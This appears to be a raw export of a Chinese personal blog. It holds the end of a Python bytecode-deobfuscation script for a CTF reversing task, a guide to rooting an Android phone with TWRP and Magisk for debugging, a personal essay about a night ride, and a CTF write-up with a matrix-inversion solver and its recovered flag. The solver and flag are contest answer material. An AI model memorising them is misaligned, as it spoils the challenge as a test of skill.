class="line"></span><br><span class="line">    flat_mem = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(raw_code))]</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> trace_result.items():</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(v):</span><br><span class="line">            flat_mem[k + i] = <span class="number">1</span></span><br><span class="line">    new_code = []</span><br><span class="line">    idx = <span class="number">0</span> </span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> raw_code:</span><br><span class="line">        <span class="keyword">if</span> flat_mem[idx] == <span class="number">1</span>:</span><br><span class="line">            new_code.append(d)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            new_code.append(dis.opmap[<span class="string">&#x27;NOP&#x27;</span>])</span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    new_code = <span class="built_in">bytes</span>(new_code)</span><br><span class="line">    <span class="keyword">return</span> new_code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recompile</span>(<span class="params">func, new_code</span>):</span><br><span class="line">    all_wrap = &#123;&#125;</span><br><span class="line">    worker = &#123;&#125;</span><br><span class="line">    temp = []</span><br><span class="line">    last = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> insn <span class="keyword">in</span> dis._get_instructions_bytes(new_code):</span><br><span class="line">        <span class="keyword">if</span> insn.opname == <span class="string">&#x27;EXTENDED_ARG&#x27;</span>:</span><br><span class="line">            temp.append(insn)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            inst = InstWrapper(temp.copy(), insn)</span><br><span class="line">            <span class="keyword">if</span> inst.offset <span class="keyword">in</span> worker.keys():</span><br><span class="line">                <span class="keyword">for</span> other <span class="keyword">in</span> worker[inst.offset]:</span><br><span class="line">                    other.edge(inst)</span><br><span class="line">                worker.pop(inst.offset)</span><br><span class="line">            <span class="keyword">if</span> last <span class="keyword">and</span> last.main_insn.opname != <span class="string">&#x27;RETURN_VALUE&#x27;</span> <span class="keyword">and</span> last.main_insn.opname != <span class="string">&#x27;JUMP_FORWARD&#x27;</span> <span class="keyword">and</span> last.main_insn.opname != <span class="string">&#x27;JUMP_ABSOLUTE&#x27;</span>:</span><br><span class="line">                last.edge(inst)</span><br><span class="line">            last = inst</span><br><span class="line">            <span class="keyword">if</span> inst.main_insn.opcode <span class="keyword">in</span> dis.hasjabs + dis.hasjrel:</span><br><span class="line">                </span><br><span class="line">                target = inst.main_insn.argval</span><br><span class="line">                <span class="keyword">if</span> target <span class="keyword">in</span> all_wrap.keys():</span><br><span class="line">                    inst.edge(all_wrap[target])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> target <span class="keyword">in</span> worker.keys():</span><br><span class="line">                        worker[target].add(inst)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        worker[target] = <span class="built_in">set</span>([inst])</span><br><span class="line">            all_wrap.update(&#123;inst.offset : inst&#125;)</span><br><span class="line">            temp.clear()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    all_wrap = <span class="built_in">list</span>(all_wrap.values())</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        to_remove = []</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> all_wrap:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(n.preds) == <span class="number">0</span> <span class="keyword">and</span> n.offset != <span class="number">0</span>:</span><br><span class="line">                n.unlink()</span><br><span class="line">                to_remove.append(n)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(n.preds) == <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">len</span>(n.succs) == <span class="number">1</span> <span class="keyword">and</span> n.main_insn.opname == <span class="string">&#x27;JUMP_FORWARD&#x27;</span>:</span><br><span class="line">                n.unlink()</span><br><span class="line">                p = n.preds.pop()</span><br><span class="line">                s = n.succs.pop()</span><br><span class="line">                p.edge(s)</span><br><span class="line">                to_remove.append(n)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(to_remove) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> to_remove:</span><br><span class="line">            all_wrap.remove(n)</span><br><span class="line"></span><br><span class="line">    entry_point = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> all_wrap:</span><br><span class="line">        <span class="keyword">if</span> i.offset == <span class="number">0</span>:</span><br><span class="line">            entry_point = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    visited = <span class="built_in">set</span>()</span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">visit</span>(<span class="params">cur : InstWrapper</span>):</span><br><span class="line">        <span class="keyword">nonlocal</span> visited, offset</span><br><span class="line">        cur.offset = offset</span><br><span class="line">        offset = offset + cur.size()</span><br><span class="line">        succs = <span class="built_in">sorted</span>(<span class="built_in">list</span>(cur.succs), key = <span class="keyword">lambda</span> a : a.offset)</span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> succs:</span><br><span class="line">            <span class="keyword">if</span> node <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">                visited.add(node)</span><br><span class="line">                visit(node)</span><br><span class="line"></span><br><span class="line">    visit(entry_point)</span><br><span class="line">    new_bytecode = []</span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> all_wrap:</span><br><span class="line">        new_bytecode += w.print_asm()</span><br><span class="line">    <span class="built_in">print</span>(new_bytecode)</span><br><span class="line">    new_bytecode = <span class="built_in">bytes</span>(new_bytecode)</span><br><span class="line"></span><br><span class="line">    code = func.__code__</span><br><span class="line">    new_code = types.CodeType(</span><br><span class="line">        code.co_argcount,</span><br><span class="line">        code.co_posonlyargcount,</span><br><span class="line">        code.co_kwonlyargcount,</span><br><span class="line">        code.co_nlocals,</span><br><span class="line">        code.co_stacksize,</span><br><span class="line">        code.co_flags,</span><br><span class="line">        new_bytecode, </span><br><span class="line">        code.co_consts,</span><br><span class="line">        code.co_names,</span><br><span class="line">        code.co_varnames,</span><br><span class="line">        code.co_filename,</span><br><span class="line">        func.__name__,</span><br><span class="line">        code.co_firstlineno,</span><br><span class="line">        code.co_lnotab,</span><br><span class="line">        code.co_freevars,</span><br><span class="line">        code.co_cellvars</span><br><span class="line">    )</span><br><span class="line">    dot = Digraph(func.__name__)</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> all_wrap:</span><br><span class="line">        dot.node(<span class="built_in">str</span>(n.offset), <span class="built_in">str</span>(n))</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> all_wrap:</span><br><span class="line">        <span class="keyword">for</span> pred <span class="keyword">in</span> n.preds:</span><br><span class="line">            dot.edge(<span class="built_in">str</span>(pred.offset), <span class="built_in">str</span>(n.offset))</span><br><span class="line">    <span class="comment">#dot.view()</span></span><br><span class="line">    <span class="keyword">return</span> new_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;RightBack.pyc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">data = file.read()</span><br><span class="line">file.close()</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;RightBack_fix.pyc&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> get_funcs(RightBack):</span><br><span class="line">    new_code = fix_invalid(f)</span><br><span class="line">    code_obj = recompile(f, new_code)</span><br><span class="line">    <span class="built_in">setattr</span>(RightBack, f.__name__, code_obj)</span><br><span class="line"></span><br><span class="line">    byc = <span class="built_in">open</span>(f.__name__ + <span class="string">&#x27;.pyc&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    byc.write(<span class="string">b&#x27;\x61\x0D\x0D\x0A\x00\x00\x00\x00\xC1\xC5\xC0\x64\x9C\x27\x00\x00&#x27;</span>)</span><br><span class="line">    marshal.dump(code_obj, byc)</span><br><span class="line">    byc.close()</span><br><span class="line">    <span class="comment">#raw_code = f.__code__.co_code</span></span><br><span class="line">    <span class="comment">#data = data.replace(raw_code, new_code)</span></span><br><span class="line"></span><br><span class="line">file.write(data)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>re python</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓调试初探</title>
    <url>/2023/07/11/%E5%AE%89%E5%8D%93%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="preface说是初探也不是很初探吧其实前面多多少少弄过完整的流程了但是由于hyperv这玄学东西后面搞的环境一团糟打算还是重新弄一个完整的调试方案出来顺便记录一些基础知识"><a class="markdownIt-Anchor" href="#preface说是初探也不是很初探吧其实前面多多少少弄过完整的流程了但是由于hyperv这玄学东西后面搞的环境一团糟打算还是重新弄一个完整的调试方案出来顺便记录一些基础知识">#</a> preface：说是初探，也不是很初探吧其实，前面多多少少弄过完整的流程了，但是由于 hyperV 这玄学东西后面搞的环境一团糟，打算还是重新弄一个完整的调试方案出来，顺便记录一些基础知识</h6>
<span id="more"></span>
<h6 id="初学配安卓环境挺痛苦的有几大原因还没准备可以root的真机在x86架构下跑arm的方案很少流畅的更少能比较流畅运行的大多是商业模拟器但是我的本地linux环境大多放在wsl2上商业模拟器很多与wsl2的hyperv冲突"><a class="markdownIt-Anchor" href="#初学配安卓环境挺痛苦的有几大原因还没准备可以root的真机在x86架构下跑arm的方案很少流畅的更少能比较流畅运行的大多是商业模拟器但是我的本地linux环境大多放在wsl2上商业模拟器很多与wsl2的hyperv冲突">#</a> 初学配安卓环境挺痛苦的，有几大原因：还没准备可以 root 的真机；在 x86 架构下跑 arm 的方案很少，流畅的更少；能比较流畅运行的大多是商业模拟器，但是我的本地 linux 环境大多放在 wsl2 上，商业模拟器很多与 wsl2 的 hyperV 冲突</h6>
<h5 id="几个尝试过或可以考虑的方案"><a class="markdownIt-Anchor" href="#几个尝试过或可以考虑的方案">#</a> 几个尝试过<s>或可以考虑</s>的方案：</h5>
<table>
<thead>
<tr>
<th style="text-align:center">Android Studio</th>
<th style="text-align:center">mumu12</th>
<th style="text-align:center">qemu</th>
<th style="text-align:center">真机</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">选择多，但是 arm 调不动</td>
<td style="text-align:center">使用方便</td>
<td style="text-align:center">~~ 配置麻烦，~~ 多数时候没法用</td>
<td style="text-align:center"><s>准备尝试</s> <s>已配置，需要 root，略麻烦</s> 启动！</td>
</tr>
</tbody>
</table>
<h5 id="1-android-studio"><a class="markdownIt-Anchor" href="#1-android-studio">#</a> 1、Android Studio</h5>
<p>在 so 有 x86 支持时为比较优解，可以随意选择安卓版本来使用。仅支持 arm 时本机能成功运行的镜像仅有：<img loading="lazy" data-src="%E5%AE%89%E5%8D%93%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2/image-20230811134825647.png" alt="image-20230811134825647">armeabi-v7a 的 Nougat，但很多新的 apk 都是 arm64-v8a，这里本机跑会报很多错，而且很慢很慢</p>
<p>2、正常情况下可以用 nox 或者雷电模拟器，稳定性还行，但是有 wsl2 的情况下会出奇怪问题（雷电号称是有兼容的，但是实测用起来会卡死，懒得修了直接换个）之前一直用的 mumux，但是这两天连 adb 会触发强制更新，换成 mumu12 居然还可以用，属于比较惊喜的，在真机拿到前可以先用这个方案</p>
<p>mumu12 用的 x86 的架构，但是实测是可以跑 arm64-v8a 的，具体原理不太懂，但是确实挺好用的，可以按照这篇操作，调试 so 层</p>
<p><a href="https://www.cnblogs.com/ddms/p/8820044.html">IDA 远程调试 Android 中 so 文件 - jKing777 - 博客园 (cnblogs.com)</a></p>
<h5 id="3-qemu"><a class="markdownIt-Anchor" href="#3-qemu">#</a> 3、qemu</h5>
<p>搭建很麻烦，需要配置可视化，非常麻烦。</p>
<h5 id="4-真机"><a class="markdownIt-Anchor" href="#4-真机">#</a> 4、真机</h5>
<p>理论上的最优解，但是不知道比起商业模拟器优多少呢</p>
<hr>
<h6 id="群开发高手那里收了个二手红米还得是小米"><a class="markdownIt-Anchor" href="#群开发高手那里收了个二手红米还得是小米">#</a> <s>群开发高手那里收了个二手红米，还得是小米</s></h6>
<p>简单记录一下：</p>
<ul>
<li>
<p>收的手机是已经解了 bl 锁的，可以暂时跳过这一步（<a href="http://www.romleyuan.com/lec/read?id=83">小米手机官方解锁 BootLoader 图文教程 - 适用于全部机型 20210925 更新 - ROM 乐园官网 (romleyuan.com)</a>）</p>
<ul>
<li>
<p>” 我的设备 “-&gt; “全部参数” -&gt; 连续点击 “MIUI 版本” 进入开发者模式 -&gt; 在开发者模式中打开 adb 调试等选项</p>
</li>
<li>
<p><code>adb devices</code>  检查设备</p>
</li>
<li>
<p><code>adb shell</code>  进入</p>
</li>
</ul>
</li>
<li>
<p>刷入 TWRP 进行 root（刷失败了就下音量 + 电源键重新进入 FASTBOOT，每次需要重新刷入）</p>
<ul>
<li><code>adb reboot bootloader</code>  转为 FASTBOOT 模式（<a href="https://www.hardreset.info/zh/devices/xiaomi/xiaomi-redmi-note-8-pro/faq/drivers/drivers-xiaomi/">windows 缺少驱动在这里下载</a>）</li>
<li><code>fastboot devices</code>  看到设备</li>
<li><code>fastboot flash recovery D:\android\BRP3.5.2v3.1-Red-twrp\recovery.img</code>  刷入 TWRP（[<a href="https://forum.xda-developers.com/t/recovery-unofficial-begonia-recovery-project-themed-twrp-3-5-0-v2-unified-begonia-begoniain.4242717/">RECOVERY][UNOFFICIAL] Begonia Recovery Project Themed TWRP 3.5.0 V2 UNIFIED [begonia/begoniain] | XDA Forums (xda-developers.com)</a>）</li>
<li><code>fastboot flash recover</code>  启动 TWRP（选择系统重启可以回到系统）</li>
</ul>
</li>
<li>
<p>刷入 Magisk（ <code>adb push D:\android\Magisk\Magisk.v26.3.zip /sdcard/</code> ）</p>
<ul>
<li>
<p>在手机上根据提示操作，adb 上 <code>su</code>  即可获得 root</p>
<h5 id="大功告成"><a class="markdownIt-Anchor" href="#大功告成">#</a> 大功告成！</h5>
<p><img loading="lazy" data-src="%E5%AE%89%E5%8D%93%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2/image-20230913202333767.png" alt="image-20230913202333767"></p>
</li>
</ul>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>夜彳亍</title>
    <url>/2023/03/17/%E5%A4%9C%E5%BD%B3%E4%BA%8D/</url>
    <content><![CDATA[<h4 id="夜彳亍京城"><a class="markdownIt-Anchor" href="#夜彳亍京城">#</a> 夜彳亍京城</h4>
<h6 id="题目来源于aidai学长-bridge和nova等"><a class="markdownIt-Anchor" href="#题目来源于aidai学长-bridge和nova等">#</a> 题目来源于 AiDai 学长、bridge 和 nova 等</h6>
<h6 id="长久不写文感觉还是需要偶尔动动笔不然对不起初高中语文老师"><a class="markdownIt-Anchor" href="#长久不写文感觉还是需要偶尔动动笔不然对不起初高中语文老师">#</a> 长久不写文，感觉还是需要偶尔动动笔，不然对不起初高中语文老师</h6>
<span id="more"></span>
<ul>
<li><a href="#1">夜彳亍</a></li>
<li><a href="#2">回程</a></li>
</ul>
<h4 id="div-id-1夜彳亍div"><a class="markdownIt-Anchor" href="#div-id-1夜彳亍div">#</a> <div id="1">夜彳亍<div></div></div></h4>
<p>倒也没有什么特别想去的地方，但缘由是一直呆在校内挺累的，一天也没有什么安静的独处时间，于是乎于 2023 年 3 月 17 日夜晚八点零七分，欣然骑了个车夜彳亍。</p>
<p>这样的夜彳亍前一阵也来了一次，约莫是在下午的夜彳亍。但出校门右转，沿着高架上的地铁一路走，走到尽头，由于不能判断前面的路上了高架还能不能正常下来，便作罢回校。</p>
<p>这么走是没有目的的，所以也不看导航，但也总该有点方向，旁边的岔路晚上并不怎么开灯，对于夜彳亍来说似乎也有些危险。于是沿着同一个高架，同一个地铁线走，往左。天气很冷，夜晚夜彳亍比下午冷多了，尤其是骑车，颇有手指不可屈伸的美感。</p>
<p>但往左走原来也有尽头，高架只会带你走短短一些路。等到了路尾，发现没有路了，人群往四面散去。有些人似乎是执意孤行的，在末尾上了地铁。似乎都是大学生。短暂的二十载中，我也一直跟着地铁，我不知道该往哪走，我只知道大家都走这条路。不走这条路的人，或许附近有房，或许在附近打晚工，总归不是一道人。跟着一道人走，往往是没错的。但尽头没路了。但上地铁并不是我此行的目的，也不是我这个时间的想法。那往左拐，左边的人比较多，或许会指引我到什么地方。</p>
<p>这条路真的很长，长到看不出有什么尽头。就只是一路往下。这里真的很不像北京。或者说不像我想象中的北京。感觉就只是，无端的，荒凉。也许它并不荒凉。但是比想象中的荒凉。车水马龙。</p>
<p>这个点的车水马龙，并不是什么繁华的象征。</p>
<p>这意味着这条路是背离市中心的，向着居民区延伸的。</p>
<p>也许也不是，期间看到一些奇怪的路牌，但是并没有看到与之相称的人，或许是荒废已久的路牌。</p>
<p>一路走下去，没什么特别的。</p>
<p>就只是不断不断的出现岔路，岔路的尽头是黑的，一进岔路就几乎没有光了。我的小小共享单车没有车头灯，如果在八十线小城骑一辆有灯的小电动，也许可以敢往下拐，但是我只能不断前进。</p>
<p>就只是车越来越少，人行道上也看不见什么人了。</p>
<p>那看看手机地图吧。</p>
<p>路途中间我是没有看地图的。本来就是没有目的的夜彳亍，看地图总归煞了风景。但那条路真的很长。长得怎么骑也看不到尽头，我也不知道我骑了多远。但这趟夜彳亍我不打算过夜的，我的东西还放在图书馆，得十一点前回来收拾。所以还是看了看地图。</p>
<p>我原以为我一直在走大道。但实际上似乎还是走到小道里了。</p>
<p>看不出来，因为一直在自认为最光亮的一条路上走。所以回过头看地图，却也感到诧异。</p>
<p>不过嘛，没有目的的夜彳亍，确实应该是这样的，也比较有意思。</p>
<p>那就回来吧，其实也挺无聊的。</p>
<p>一般都是这样，来的时候总觉得走了好长好长一段路，回首却一会就到了。</p>
<p>来的时候，右边看到一个卖馒头的。</p>
<p>看不清，似乎没人，看到了微信收款码。</p>
<p>还听到（或许是看到呢）一清二楚的大馒头一块钱一个。</p>
<p>来的时候，就在最后一个十字路口，有一个老太在卖玉米。</p>
<p>烤玉米，用一个炉子在烧。她似乎在将硬纸板一点一点的塞进去，也许是有火星子冒出来。</p>
<p>她戴的手套看着很暖和。人群中似乎就我一个人愚蠢到不戴手套。但是具体的我没太注意，绿灯亮起我也就过去了。她似乎在对着过往的人群，大学生或什么，并不大声地喊着烤玉米或玉米的价格或什么。总能在眼里看到一些希冀，或者其他什么。</p>
<p>总归这次出行没注意什么细节，也许是夜里冷，人太少的缘故。但过来的路确实也又有些不同。总感觉，遛狗的人，悠闲的人多了。</p>
<p>提着菜的，忙碌的人比来时的路少了。</p>
<p>回到十字路口。茫然发现，其实过来这条路并不长。</p>
<p>确实，回头看的时候总觉得，其实确实不是一条有多长的路。</p>
<p>但反正，还有时间，那在地铁入口的路口，往右拐看看。</p>
<p>但房屋却比较高大了。虽然还是稀疏。道路也比较宽广了。</p>
<p>一阵后，感觉没有那么想继续了，回程吧。下次或许从这里继续。</p>
<p>也有可能去看一下水库，据说风景不错。但是水库大抵是不能晚上去，那只能白天夜彳亍去一趟。</p>
<h4 id="div-id-2-回程div"><a class="markdownIt-Anchor" href="#div-id-2-回程div">#</a> <div id="2">・回程<div></div></div></h4>
<p>总归是一会就回来了，什么也没发生。本来也不期待什么会发生。</p>
<p>但也还算发生了点什么，算是给点时间。</p>
<p>回来看这群打 ctf 的好像也没聊啥，那倒没错过啥。</p>
<p>虽然水群太多是该戒戒就是。</p>
<p>倒是收到某位的消息，想给我 “测评” 铃芽之旅。你最好是在测评，还是等我们这些非北大生惨兮兮下周看完电影再聊吧。</p>
<h6 id="感觉确实是不如bridge或者nova写的有水平的反正随手一记当是开个新坑以后多做一些记录"><a class="markdownIt-Anchor" href="#感觉确实是不如bridge或者nova写的有水平的反正随手一记当是开个新坑以后多做一些记录">#</a> 感觉确实是不如 bridge 或者 nova 写的有水平的，反正随手一记，当是开个新坑，以后多做一些记录。</h6>
<h6 id="没拍啥照片确实没啥好拍的也确实手冻的拿不住手机"><a class="markdownIt-Anchor" href="#没拍啥照片确实没啥好拍的也确实手冻的拿不住手机">#</a> 没拍啥照片，确实没啥好拍的，也确实手冻的拿不住手机。</h6>
]]></content>
  </entry>
  <entry>
    <title>铁三awd渗透复盘</title>
    <url>/2024/04/24/%E9%93%81%E4%B8%89awd%E6%B8%97%E9%80%8F%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>蓝帽2023半决</title>
    <url>/2023/09/19/%E8%93%9D%E5%B8%BD2023%E5%8D%8A%E5%86%B3/</url>
    <content><![CDATA[<h6 id="preface-赛中总觉得是该用z3写或者angr跑但是死活出不来结果发现就是一个矩阵乘法"><a class="markdownIt-Anchor" href="#preface-赛中总觉得是该用z3写或者angr跑但是死活出不来结果发现就是一个矩阵乘法">#</a> PREFACE: 赛中总觉得是该用 z3 写，或者 angr 跑，但是死活出不来，结果发现就是一个矩阵乘法</h6>
<span id="more"></span>
<p>先给个程序流程，比较简单的</p>
<p><img loading="lazy" data-src="%E8%93%9D%E5%B8%BD2023%E5%8D%8A%E5%86%B3/image-20230919191052104.png" alt="image-20230919191052104"></p>
<p><img loading="lazy" data-src="%E8%93%9D%E5%B8%BD2023%E5%8D%8A%E5%86%B3/image-20230919191107056.png" alt="image-20230919191107056"></p>
<p>就没了，就结束了…</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">A = [<span class="number">0xfe</span>, <span class="number">0xb</span>, <span class="number">0x1d</span>, <span class="number">0xf6</span>, <span class="number">0x83</span>, <span class="number">0xff</span>, <span class="number">0xe0</span>, <span class="number">0xb8</span>, <span class="number">0xdd</span>, <span class="number">0xb0</span>, <span class="number">0xc5</span>, <span class="number">0xde</span>, <span class="number">0xf6</span>, <span class="number">0x14</span>, <span class="number">0x9f</span>, <span class="number">0xdd</span>, <span class="number">0xd9</span>, <span class="number">0x7</span>, <span class="number">0x2d</span>, <span class="number">0x6b</span>, <span class="number">0x19</span>, <span class="number">0xca</span>, <span class="number">0x73</span>, <span class="number">0xfd</span>, <span class="number">0x87</span>, <span class="number">0x72</span>, <span class="number">0x24</span>, <span class="number">0x4</span>, <span class="number">0x49</span>, <span class="number">0x7e</span>, <span class="number">0xa9</span>, <span class="number">0xce</span>, <span class="number">0x91</span>, <span class="number">0xbe</span>, <span class="number">0x41</span>, <span class="number">0x18</span>, <span class="number">0x60</span>, <span class="number">0x3f</span>, <span class="number">0x2b</span>, <span class="number">0x63</span>, <span class="number">0x1c</span>, <span class="number">0xd2</span>, <span class="number">0x90</span>, <span class="number">0xe9</span>, <span class="number">0x8e</span>, <span class="number">0xba</span>, <span class="number">0x1e</span>, <span class="number">0xf3</span>, <span class="number">0x41</span>, <span class="number">0xad</span>,</span><br><span class="line">     <span class="number">0x2c</span>, <span class="number">0x3</span>, <span class="number">0x69</span>, <span class="number">0xda</span>, <span class="number">0x10</span>, <span class="number">0xfd</span>, <span class="number">0xfd</span>, <span class="number">0xe7</span>, <span class="number">0x6</span>, <span class="number">0x36</span>, <span class="number">0xd6</span>, <span class="number">0x2</span>, <span class="number">0x59</span>, <span class="number">0x18</span>, <span class="number">0xcc</span>, <span class="number">0x50</span>, <span class="number">0x87</span>, <span class="number">0xaf</span>, <span class="number">0xfb</span>, <span class="number">0x18</span>, <span class="number">0x44</span>, <span class="number">0x7f</span>, <span class="number">0xad</span>, <span class="number">0xf8</span>, <span class="number">0x2c</span>, <span class="number">0x67</span>, <span class="number">0x1d</span>, <span class="number">0x22</span>, <span class="number">0x84</span>, <span class="number">0xac</span>, <span class="number">0xe</span>, <span class="number">0x23</span>, <span class="number">0xdc</span>, <span class="number">0xe6</span>, <span class="number">0xbb</span>, <span class="number">0xd2</span>, <span class="number">0xb8</span>, <span class="number">0x4a</span>, <span class="number">0xbc</span>, <span class="number">0xde</span>, <span class="number">0x50</span>, <span class="number">0x9c</span>, <span class="number">0x1c</span>, <span class="number">0x1e</span>, <span class="number">0x86</span>, <span class="number">0x3a</span>, <span class="number">0x2d</span>, <span class="number">0xdd</span>, <span class="number">0xc3</span>, <span class="number">0x3</span>]</span><br><span class="line">B = [<span class="number">0x1c633</span>, <span class="number">0x1df94</span>, <span class="number">0x20ebf</span>, <span class="number">0x2ba40</span>, <span class="number">0x1e884</span>, <span class="number">0x260d1</span>, <span class="number">0x1f9b1</span>, <span class="number">0x1ea1a</span>, <span class="number">0x1eeaa</span>, <span class="number">0x1dfb2</span>, <span class="number">0x1c1d0</span>, <span class="number">0x1eef2</span>, <span class="number">0x216e1</span>, <span class="number">0x2be00</span>, <span class="number">0x1fb5e</span>, <span class="number">0x25d74</span>, <span class="number">0x1f000</span>, <span class="number">0x202d6</span>, <span class="number">0x20002</span>, <span class="number">0x1ddfe</span>, <span class="number">0x1c017</span>, <span class="number">0x1f08c</span>, <span class="number">0x227f6</span>, <span class="number">0x2c7ba</span>, <span class="number">0x201ae</span>, <span class="number">0x27fbf</span>, <span class="number">0x20e21</span>, <span class="number">0x1ff5c</span>, <span class="number">0x1fd62</span>, <span class="number">0x1e948</span>, <span class="number">0x1be6e</span>, <span class="number">0x1f4d7</span>, <span class="number">0x22c8d</span>, <span class="number">0x2c353</span>, <span class="number">0x1f8db</span>, <span class="number">0x26e1d</span>, <span class="number">0x1ff61</span>, <span class="number">0x1ea0f</span>, <span class="number">0x1f0d6</span>, <span class="number">0x1eda8</span>, <span class="number">0x1ad7d</span>, <span class="number">0x18218</span>, <span class="number">0x1ccd4</span>, <span class="number">0x239b6</span>, <span class="number">0x1ac4c</span>, <span class="number">0x20d7c</span>, <span class="number">0x1d967</span>, <span class="number">0x1a4f4</span>, <span class="number">0x1cad8</span>, <span class="number">0x196ae</span>,</span><br><span class="line">     <span class="number">0x1831b</span>, <span class="number">0x17e45</span>, <span class="number">0x1d0cf</span>, <span class="number">0x23edf</span>, <span class="number">0x181ae</span>, <span class="number">0x21760</span>, <span class="number">0x1d3b4</span>, <span class="number">0x175d6</span>, <span class="number">0x17d3a</span>, <span class="number">0x1994f</span>, <span class="number">0x1189d</span>, <span class="number">0x14ccf</span>, <span class="number">0x1568e</span>, <span class="number">0x17eeb</span>, <span class="number">0x1327e</span>, <span class="number">0x16a45</span>, <span class="number">0x12921</span>, <span class="number">0x11ff0</span>, <span class="number">0x13643</span>, <span class="number">0x11729</span>, <span class="number">0x15191</span>, <span class="number">0x17d17</span>, <span class="number">0x17262</span>, <span class="number">0x1a863</span>, <span class="number">0x17010</span>, <span class="number">0x17b10</span>, <span class="number">0x14f9c</span>, <span class="number">0x143e8</span>, <span class="number">0x15e9b</span>, <span class="number">0x1242c</span>, <span class="number">0xf68c</span>, <span class="number">0x1192a</span>, <span class="number">0x150ad</span>, <span class="number">0x1b1a0</span>, <span class="number">0x14c60</span>, <span class="number">0x182ab</span>, <span class="number">0x13f4b</span>, <span class="number">0x141a6</span>, <span class="number">0x15aa3</span>, <span class="number">0x135c9</span>, <span class="number">0x1d86f</span>, <span class="number">0x1e8fa</span>, <span class="number">0x2158d</span>, <span class="number">0x2bdac</span>, <span class="number">0x20e4f</span>, <span class="number">0x27ee6</span>, <span class="number">0x213b9</span>, <span class="number">0x20e86</span>, <span class="number">0x211ff</span>, <span class="number">0x1e1ef</span>]</span><br><span class="line">A_Mat = []</span><br><span class="line">B_Mat = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>, <span class="number">10</span>):</span><br><span class="line">    tmp = A[i:i+<span class="number">10</span>]</span><br><span class="line">    A_Mat.append(tmp)</span><br><span class="line">    tmp = B[i:i+<span class="number">10</span>]</span><br><span class="line">    B_Mat.append(tmp)</span><br><span class="line">A_Mat = np.mat(A_Mat)</span><br><span class="line">B_Mat = np.mat(B_Mat)</span><br><span class="line">X_Mat = np.dot(B_Mat, np.linalg.inv(A_Mat))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(X_Mat)):</span><br><span class="line">    tmp = X_Mat[i].tolist()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">round</span>(tmp[j])), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># there_are_a_lot_useless_information_but_oh.o0O_flag&#123;8f9c6cf7-f362-4a4e-ace2-a34d90939589&#125;_you_get_it</span></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>强网拟态2023</title>
    <url>/2023/11/12/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812023/</url>
    <content><![CDATA[<h6 id="preface初赛成绩一般车联网那个vpn没看懂属于是经验不足了"><a class="markdownIt-Anchor" href="#preface初赛成绩一般车联网那个vpn没看懂属于是经验不足了">#</a> PREFACE：初赛成绩一般，车联网那个 vpn 没看懂，属于是经验不足了</h6>
